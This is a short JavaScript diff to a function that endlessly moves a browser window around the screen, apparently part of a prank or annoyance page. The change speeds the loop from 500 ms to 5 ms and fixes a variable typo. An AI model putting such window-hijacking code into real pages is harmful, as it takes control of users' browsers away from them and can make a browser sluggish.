@@ -1,10 +1,10 @@
 var xOffset = 15;
 var yOffset = 15;
-var xPos = 350;
+var xPos = 50;
 var yPos = -75;
 async function bouncy(win) {
     while (true) {
-    await new Promise(r => setTimeout(r, 500)); //wait a second so we dont *completely* crash. ;)
+    await new Promise(r => setTimeout(r, 5)); //wait a few ms so we dont *completely* crash. ;)
     xPos += xOffset;
     yPos += yOffset;
     if (xPos > screen.width-175){
@@ -15,10 +15,10 @@ async function bouncy(win) {
         xOffset = Math.ceil(8 * Math.random())  * 5 - 10 ;
     }
     if (yPos > screen.height-100){
-        yxOffset = Math.ceil( (6 * -1) * Math.random())  * 5 - 10 ;
+        yOffset = Math.ceil( (6 * -1) * Math.random())  * 5 - 10 ;
     }
     if (yPos < 0){
-        yxOffset = Math.ceil( 8 * Math.random())  * 5 - 10 ;
+        yOffset = Math.ceil( 8 * Math.random())  * 5 - 10 ;
     }
     try {
     win.moveTo(xPos,yPos);
